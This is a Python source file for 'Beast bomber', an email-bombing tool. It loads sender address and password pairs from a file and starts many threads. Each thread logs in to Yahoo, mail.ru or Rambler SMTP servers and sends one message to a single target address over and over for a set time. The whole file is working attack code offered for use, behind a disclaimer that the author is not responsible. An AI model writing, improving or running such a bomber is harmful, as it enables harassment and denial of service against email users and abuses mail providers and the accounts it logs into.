"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                   Beast bomber                                  ║
║  Author:                                                                        ║
║  https://github.com/un1cum                                                      ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                            Copyright (C) 2023 un1cum                            ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""
import threading
import time
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import make_msgid

def email_start(threads, time_a, email, mes, subj):
    emails = []
    with open(os.path.abspath('input/email_accounts.txt'), 'r') as file:
        for line in file:
            emails.append(line.replace('\n', ''))

    for _ in range(threads):
        threading.Thread(target=email_attack, args=(emails, time_a, email, mes, subj)).start()


def email_attack(emails, time_a, email, mes, subj):
    t = time.monotonic()

    while time.monotonic() - t < time_a:
        for em in emails:
            smtp = ''
            if '@yahoo.com' in em:
                smtp = 'smtp.mail.yahoo.com'
            elif '@mail.ru' in em:
                smtp = 'smtp.mail.ru'
            else:
                smtp = 'smtp.rambler.ru'

            line = em.split(':')
            from_email = line[0]
            from_pas = line[1]

            try:
                msg = MIMEMultipart()
                msg['Message-ID'] = make_msgid()
                msg['From'] = from_email
                msg['To'] = email
                msg['Subject'] = subj
                msg.attach(MIMEText(mes, 'plain'))

                server = smtplib.SMTP(smtp, 587)
                server.ehlo()
                server.starttls()
                server.ehlo()
                server.login(msg['From'], from_pas)
                server.sendmail(msg['From'], msg['To'], msg.as_string())
                server.quit()
            except Exception as e:
                print(f"Error occurred while sending email: {e}")  # You can log the error here or just print it.

